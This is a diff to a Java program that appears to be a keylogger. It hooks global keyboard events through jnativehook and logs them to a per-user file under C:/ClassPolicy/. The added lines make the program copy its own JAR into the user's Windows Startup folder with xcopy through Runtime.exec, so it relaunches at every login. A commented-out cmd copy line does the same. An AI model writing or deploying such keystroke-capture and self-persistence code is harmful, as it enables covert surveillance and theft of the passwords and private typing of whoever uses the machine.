@@ -7,13 +7,23 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.net.URISyntaxException;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener{
-	public static void main (String[] args) throws IOException {
+	public static void main (String[] args) throws IOException, URISyntaxException {
+		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+		System.out.println("Location " + yiffyiff);
+		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+		System.out.println("Startup " + startup);
+		System.out.println("Running command " + System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
+		 @SuppressWarnings("unused")
+		//  Process selfcopy = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "copy \"" + yiffyiff + "\"" + " \"" + startup +"\"");
+		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
+		 
 		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
 		if(!log.exists()) {
 			System.out.println("Creating logfile...");
